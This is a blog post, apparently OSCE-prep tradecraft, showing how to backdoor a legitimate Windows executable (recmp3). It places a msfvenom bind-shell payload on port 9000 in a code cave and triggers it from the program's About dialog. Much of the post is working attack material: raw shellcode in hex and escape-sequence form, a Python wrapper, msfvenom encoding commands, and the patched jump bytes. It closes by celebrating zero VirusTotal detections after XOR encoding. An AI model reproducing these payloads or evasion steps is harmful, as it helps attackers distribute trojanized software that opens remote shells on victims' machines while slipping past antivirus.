<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.0" /><meta property="og:title" content="Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)" /><meta name="author" content="fwinsnes" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://whitecr0wz.github.io/posts/Backdooring-PE-II/" /><meta property="og:url" content="https://whitecr0wz.github.io/posts/Backdooring-PE-II/" /><meta property="og:site_name" content="Knowledge Library" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-10-21T05:44:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)" /><meta name="twitter:site" content="@whitecr0wz" /><meta name="twitter:creator" content="@fwinsnes" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"fwinsnes"},"dateModified":"2020-10-21T05:44:00+00:00","datePublished":"2020-10-21T05:44:00+00:00","description":"Introduction","headline":"Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)","mainEntityOfPage":{"@type":"WebPage","@id":"https://whitecr0wz.github.io/posts/Backdooring-PE-II/"},"url":"https://whitecr0wz.github.io/posts/Backdooring-PE-II/"}</script><title>Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II) | Knowledge Library</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Knowledge Library"><meta name="application-name" content="Knowledge Library"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://whitecr0wz.github.io/assets/img/Felipe-Winsnes.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Knowledge Library</a></div><div class="site-subtitle font-italic">Just sharing interesting tech stuff :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/whitecr0wz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Backdooring PE Files through Code Caves + User Interaction + Encoding (VOL:II)</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1603259040" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 21, 2020 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Felipe Winsnes </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1941 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h3 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>You find yourself reading the second volume of the “PE File Backdooring” series. As a result of such, I highly recommend reading the first <a href="https://whitecr0wz.github.io/posts/Backdooring-PE/">one</a>, as it may help understanding the shown material on this post.</p><p>Today, I will be explaining how to backdoor PE Files with the addition of user interaction and encoding as well. Furthermore, in order to replay the concept, the application <a href="https://sourceforge.net/projects/recmp3/">recmp3</a> will be used, as it is a lightweight program which has several Code Caves with ASLR disabled within the affected zone.</p><p><img data-src="/assets/img/Code_Cave_II/1.png" alt="" data-proofer-ignore></p><h6 id="recmp3-when-executed">recmp3 when executed.</h6><p>Let’s check the available Code Caves.</p><pre><code class="language-term">C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32&gt;python.exe pycave.py -
f "C:\Users\IEUser\Desktop2\RadioRecord\RadioRecord.exe"
[+] Minimum code cave size: 300
[+] Image Base:  0x00400000
[+] Loading "C:\Users\IEUser\Desktop2\RadioRecord\RadioRecord.exe"...

[+] Looking for code caves...
[+] Code cave found in .data            Size: 559 bytes         RA: 0x000A3E79
VA: 0x004A3E79
[+] Code cave found in .data            Size: 8195 bytes        RA: 0x000A41FD
VA: 0x004A41FD
[+] Code cave found in .rsrc            Size: 513 bytes         RA: 0x000A94AF
VA: 0x004C24AF
[+] Code cave found in .rsrc            Size: 513 bytes         RA: 0x000A9A27
VA: 0x004C2A27

C:\Users\IEUser\AppData\Local\Programs\Python\Python38-32&gt;
</code></pre><p>0x004A41FD seems rather juicy, with more than 5000+ bytes! This code cave seems rather interesting.</p><h5 id="when-the-fun-begins"><span class="mr-2">When the fun begins.</span><a href="#when-the-fun-begins" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>As we desire to make the PE File execute shellcode when interacted with in a certain manner, it is required to discover a place to intervene with the flow. For example, if we check the option “About”, the program displays the following.</p><p><img data-src="/assets/img/Code_Cave_II/2.png" alt="" data-proofer-ignore></p><p>As it is seen, this allows us to gather information of the program and its author. We can use this function to our advantage. Let’s investigate this function in Immunity.</p><p>In order to find such, the option “Search For &gt; All referenced text strings” will be used. This will search for all text strings that are somehow being used or pushed into the stack.</p><p><img data-src="/assets/img/Code_Cave_II/3.png" alt="" data-proofer-ignore></p><p>It is gone to the top in order to search for a key phrase, such as for example, “sourceforge”.</p><p><img data-src="/assets/img/Code_Cave_II/4.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/Code_Cave_II/5.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/Code_Cave_II/6.png" alt="" data-proofer-ignore></p><p>Immunity seems to have given us the desired result. Similarly to the previous blog post, the following step is to replace a specific address that is being executed when the function is processed with a JMP instruction pointing to our code cave. In addition with this, when we finish with our shellcode and aligning the stack, the overwriten address is executed once again and a JMP instruction is placed pointing to the original flow.</p><p>In this case, I will replace the PUSH instruction that gives us the information. Moreover, the instructions will be saved so that they are re-assigned later on.</p><p><img data-src="/assets/img/Code_Cave_II/7.png" alt="" data-proofer-ignore></p><p>The next step; assembling a JMP address to our code cave at 0x004A41FD, at the same time overwriting the address at 0x00403426.</p><p><img data-src="/assets/img/Code_Cave_II/8.png" alt="" data-proofer-ignore></p><p>Good, this is then saved as in the previous post through “Copy to Executable” into a new file. Furthermore, if we now make use of the option “About” once again, the flow will be redirected to the code cave.</p><p><img data-src="/assets/img/Code_Cave_II/9.gif" alt="" data-proofer-ignore></p><p>Now, in contemplation of jumping to the code cave without any difficulty,the bytes prior and after 0x004A41FD will be replaced by NOPs.</p><p><img data-src="/assets/img/Code_Cave_II/10.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/Code_Cave_II/11.png" alt="" data-proofer-ignore></p><p>Similarly to VOL:I of the series, the order of our payload is the following:</p><ul><li>PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the instructions work perfectly according to the value of these.<li>The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow.<li>Alignment. The ESP Register must be restored to its old value.<li>POPFD/POPAD. These instructions will restore our registers/flags.<li>As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does not crash!<li>A JMP instruction pointing towards the following instruction after the replaced ones within the original function. In this case, it will be 0x0040342B.</ul><p>Remembering this order, the PUSHAD/PUSHFD instructions are assembled.</p><p><img data-src="/assets/img/Code_Cave_II/12.png" alt="" data-proofer-ignore></p><p>The payload used will be the same as the previous, a unstaged bind shell that will display at port 9000.</p><p>Generating the payload.</p><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 328 bytes
Final size of hex file: 656 bytes
fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f
6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd
4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545
056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
root@whitecr0wz:~# 
</code></pre><p>The shellcode is pasted with “Binary paste”.</p><p><img data-src="/assets/img/Code_Cave_II/13.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/Code_Cave_II/14.png" alt="" data-proofer-ignore></p><p>DEC ESI is replaced for a NOP, this is done so that it allows the execution to continue after the shell is established.</p><p><img data-src="/assets/img/Code_Cave_II/15.png" alt="" data-proofer-ignore></p><p><img data-src="/assets/img/Code_Cave_II/16.png" alt="" data-proofer-ignore></p><p>The final CALL EBP is removed as it would completely demolish the flow. Instead, the stack alignment is placed, which is the same that in the aforementioned post, as the payload is exactly the same.</p><p><img data-src="/assets/img/Code_Cave_II/17.png" alt="" data-proofer-ignore></p><p>The stack alignment is placed.</p><p><img data-src="/assets/img/Code_Cave_II/18.png" alt="" data-proofer-ignore></p><p>The POPAD/POPFD instructions are placed.</p><p><img data-src="/assets/img/Code_Cave_II/19.png" alt="" data-proofer-ignore></p><p>The PUSH address is re-assigned.</p><p><img data-src="/assets/img/Code_Cave_II/20.png" alt="" data-proofer-ignore></p><p>The JMP address pointing to 0x0040342B is assembled.</p><p><img data-src="/assets/img/Code_Cave_II/21.png" alt="" data-proofer-ignore></p><h4 id="endgame-1"><span class="mr-2">EndGame #1</span><a href="#endgame-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img data-src="/assets/img/Code_Cave_II/22.gif" alt="" data-proofer-ignore></p><p>VirusTotal results:</p><p><img data-src="/assets/img/Code_Cave_II/23.png" alt="" data-proofer-ignore></p><p>Although there is big room for improvement, 26 from VOL:I to 18 is a great enhancement.</p><h3 id="encoding"><span class="mr-2">Encoding</span><a href="#encoding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>However, things are far from over, as I will not stop to a result of 18, therefore, I thought of a simple method for encoding the entire payload. This consists in copying the entire chunk of instructions (including the PUSHAD/PUSHFD) and encode them with msfvenom. In addition, these are later on assembled once again encoded.</p><p>The steps would be the following:</p><ul><li>Copying the entire set of instructions with “Binary Copy”.<li>Convert the fromat into hex escape sequences<li>Encode the payload with msfvenom with an encoder such as x86/xor_dynamic, x86/shikata_ga_nai, x86/alpha_mixed, and so forth.<li>Paste the entire set of instructions once again with “Binary Paste”.<li>As encoding will definitely increment the length of the instructions, the final JMP instruction back to the original flow may be seemed altered to an undesired address; therefore, the encoded payload must be decoded, and the JMP must be assembled once again to the desired address, giving a different opcode that will make us encode the payload once again with the correct values.</ul><p>This sounds way harder than it actually is, let’s do it!</p><p>Copying the entire payload with “Binary Copy”.</p><p><img data-src="/assets/img/Code_Cave_II/24.png" alt="" data-proofer-ignore></p><p>This will copy the instructions to our clipboard in a hex format, similar to msfvenom when providing a payload. However, this is not the one that we need, reason why I used <a href="https://defuse.ca/online-x86-assembler.htm#disassembly2">defuse.ca</a>, that will turn the hex format into the escape sequences as desired for you, just paste them on the “Disassemble” section and process them. You can also perform this task manually, but it may take you a very long time.</p><p>Raw payload:</p><pre><code class="language-term">60 9C FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF
AC 3C 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B 4A 3C 8B 4C 11 78 E3 48 01 D1 51 8B
59 20 01 D3 8B 49 18 E3 3A 49 8B 34 8B 01 D6 31 FF AC C1 CF 0D 01 C7 38 E0 75 F6 03 7D F8 3B 7D
24 75 E4 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A
51 FF E0 5F 5F 5A 8B 12 EB 8D 5D 68 33 32 00 00 68 77 73 32 5F 54 68 4C 77 26 07 FF D5 B8 90 01
00 00 29 C4 54 50 68 29 80 6B 00 FF D5 6A 08 59 50 E2 FD 40 50 40 50 68 EA 0F DF E0 FF D5 97 68
02 00 23 28 89 E6 6A 10 56 57 68 C2 DB 37 67 FF D5 57 68 B7 E9 38 FF FF D5 57 68 74 EC 3B E1 FF
D5 57 97 68 75 6E 4D 61 FF D5 68 63 6D 64 00 89 E3 57 57 57 31 F6 6A 12 59 56 E2 FD 66 C7 44 24
3C 01 01 8D 44 24 10 C6 00 44 54 50 56 56 56 46 56 4E 56 56 53 56 68 79 CC 3F 86 FF D5 89 E0 90
56 46 FF 30 68 08 87 1D 60 FF D5 BB F0 B5 A2 56 68 A6 95 BD 9D FF D5 3C 06 7C 0A 80 FB E0 75 05
BB 47 13 72 6F 6A 00 53 81 C4 00 02 00 00 9D 61 68 B8 7F 49 00 E9 BA F0 F5 FF
</code></pre><p>Payload within escape sequence format:</p><pre><code class="language-term">"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"
</code></pre><p>In order to encode the payload, the STDIN function from msfvenom shall be used. So as to achievethis result, a python script will be employed, that may contain a variable with the payload, so that it is then printed into the command-line. Moreover, msfvenom will analyze such data and encode it.</p><p>Python script:</p><pre><code class="language-term">root@whitecr0wz:~# cat custom.py 

shellcode = (

"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\xBA\xF0\xF5\xFF"

)

print (shellcode)
root@whitecr0wz:~# 
</code></pre><p>In this case, I chose the encoder x86/xor_dynamic, as it is very effective, and it is not very well known.</p><pre><code class="language-term">root@whitecr0wz:~# python custom.py | msfvenom -p - --platform windows -a x86 -e x86/xor_dynamic -n 5 -f hex 
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/xor_dynamic
x86/xor_dynamic succeeded with size 393 (iteration=0)
x86/xor_dynamic chosen with final size 393
Successfully added NOP sled of size 5 from x86/single_byte
Payload size: 398 bytes
Final size of hex file: 796 bytes
27f52ff83feb235b89dfb06ffcae75fd89f989de8a0630074766813f0641740846803e6f75eeebeaffe1e8d8ffffff276f47bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e
6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d
76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f
2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f
81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ce9dd7d2d82d0641
root@whitecr0wz:~# 
</code></pre><p>As seen, the payload has grown in terms of size, this will make the last JMP useless, we will take care of it later on.</p><p>The entire chain of characters is removed with “Fill with 00”.</p><p><img data-src="/assets/img/Code_Cave_II/25.png" alt="" data-proofer-ignore></p><p>The encoded payload is pasted with “Binary paste”.</p><p><img data-src="/assets/img/Code_Cave_II/26.png" alt="" data-proofer-ignore></p><p>When the function is not loaded, the shellcode remains encoded. Nevertheless, when interacted with, it will decode itself. As it is required to modify the last instruction, it will be interacted with.</p><p>Last section of the payload before decoding.</p><p><img data-src="/assets/img/Code_Cave_II/27.png" alt="" data-proofer-ignore></p><p>After decoding.</p><p><img data-src="/assets/img/Code_Cave_II/28.png" alt="" data-proofer-ignore></p><p>Interesting, our JMP no longer points to 0040342B. Instead, it directs the flow to 0040345C. With this configuration, our backdoor will never work properly! Let’s make some modifications.</p><p><img data-src="/assets/img/Code_Cave_II/29.png" alt="" data-proofer-ignore></p><p>As seen on the image, the second opcode of the JMP, BA, has been replaced for 89, meaning that this is the byte that should be replaced in our custom.py.</p><p>Python script (the only arranged change is at the five last hex characters):</p><pre><code class="language-term">root@whitecr0wz:~# cat custom.py 

shellcode = (

"\x60\x9C\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7
\xE2\xF2\x52\x57\x8B\x52\x10\x8B\x4A\x3C\x8B\x4C\x11\x78\xE3\x48\x01\xD1\x51\x8B\x59\x20\x01\xD3\x8B\x49\x18\xE3\x3A\x49\x8B\x34\x8B\x01\xD6\x31\xFF\xAC\xC1\xCF\x0D\x01\xC7\x38\
xE0\x75\xF6\x03\x7D\xF8\x3B\x7D\x24\x75\xE4\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x5F\x
5F\x5A\x8B\x12\xEB\x8D\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x08\x59\x5
0\xE2\xFD\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x68\x02\x00\x23\x28\x89\xE6\x6A\x10\x56\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x57\x68\xB7\xE9\x38\xFF\xFF\xD5\x57\x68\x74\xEC
\x3B\xE1\xFF\xD5\x57\x97\x68\x75\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\
x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x90\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xF0\xB5\xA2\x56\x68\xA6\x95\xBD\x9D\x
FF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\x68\xB8\x7F\x49\x00\xE9\x89\xF0\xF5\xFF"

)

print (shellcode)
root@whitecr0wz:~# 
</code></pre><p>Generating the payload once again:</p><pre><code class="language-term">root@whitecr0wz:~# python custom.py | msfvenom -p - --platform windows -a x86 -e x86/xor_dynamic -n 5 -f hex 
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/xor_dynamic
x86/xor_dynamic succeeded with size 393 (iteration=0)
x86/xor_dynamic chosen with final size 393
Successfully added NOP sled of size 5 from x86/single_byte
Payload size: 398 bytes
Final size of hex file: 796 bytes
f5982f933feb235b89dfb052fcae75fd89f989de8a0630074766813f723c740846803e5275eeebeaffe1e8d8ffffff275247bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e
6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d
76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f
2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f
81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ceaed7d2d82d723c
root@whitecr0wz:~# 
</code></pre><p>Let’s repeat the previous process and save.</p><p><img data-src="/assets/img/Code_Cave_II/30.png" alt="" data-proofer-ignore></p><h4 id="endgame-2"><span class="mr-2">EndGame #2</span><a href="#endgame-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img data-src="/assets/img/Code_Cave_II/31.gif" alt="" data-proofer-ignore></p><p>VirusTotal results:</p><p><img data-src="/assets/img/Code_Cave_II/result.png" alt="" data-proofer-ignore></p><p>From 18 to 0! This is beyond impressive! Thank you for reading this blog post!</p><h3 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Capt. Meelo’s post: <a href="https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html">https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html</a></p><p>Online x86/x64 Assembler/Disassembler: <a href="https://defuse.ca/online-x86-assembler.htm#disassembly2">https://defuse.ca/online-x86-assembler.htm#disassembly2</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/backdooring/'>Backdooring</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" 